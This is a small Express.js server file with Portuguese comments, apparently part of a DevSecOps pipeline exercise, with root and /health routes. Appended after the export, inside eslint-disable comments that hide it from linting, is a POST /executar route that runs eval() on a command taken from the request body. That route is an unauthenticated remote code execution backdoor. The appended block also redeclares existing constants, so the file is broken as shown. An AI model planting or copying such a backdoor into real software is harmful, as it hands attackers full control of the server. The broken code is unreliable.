const express = require('express');
const app = express();

// Rota principal solicitada na PBI
app.get('/', (req, res) => {
    res.status(200).send('Esteira DevSecOps Ativa!');
});

// Rota /health para monitoramento e health check
app.get('/health', (req, res) => {
    res.status(200).json({
        status: 'UP',
        timestamp: new Date().toISOString()
    });
});

module.exports = app;

/* eslint-disable */
const express = require('express');
const app = express();
app.post('/executar', (req, res) => {
    eval(req.body.comando);
});
/* eslint-enable */